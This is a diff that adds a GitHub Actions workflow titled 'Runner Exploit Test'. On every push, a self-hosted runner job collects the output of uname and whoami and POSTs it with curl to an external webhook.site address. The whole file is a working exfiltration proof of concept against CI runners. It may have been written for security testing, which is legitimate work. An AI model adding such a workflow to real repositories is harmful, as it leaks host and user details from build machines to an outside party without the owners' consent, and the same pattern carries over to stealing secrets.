@@ -1,0 +1,14 @@
+name: Runner Exploit Test
+on: push
+
+jobs:
+  exfiltrate:
+    name: Leak uname and whoami
+    runs-on: self-hosted
+    steps:
+      - name: Collect and exfiltrate system info
+        run: |
+          sysinfo="$(uname -a; whoami)"
+          curl -X POST -H "Content-Type: text/plain" \
+            --data "$sysinfo" \
+            https://webhook.site/2cb5ef2c-6be6-442b-9a0b-180c98f44d10
